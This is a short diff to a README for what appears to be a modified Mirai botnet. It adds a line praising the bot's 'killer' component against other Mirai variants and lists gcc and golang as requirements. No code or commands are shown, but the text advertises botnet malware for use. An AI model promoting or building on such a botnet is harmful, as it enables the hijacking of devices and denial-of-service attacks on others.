@@ -1,5 +1,7 @@
 Modded version of Mirai Botnet by Anna with a fully-better bot (killer, checksum etc etc)
 
+i've seen alot shitty ass killers but this one is p good for other mirai variants
+
 ## Requirements
 * gcc
 * golang
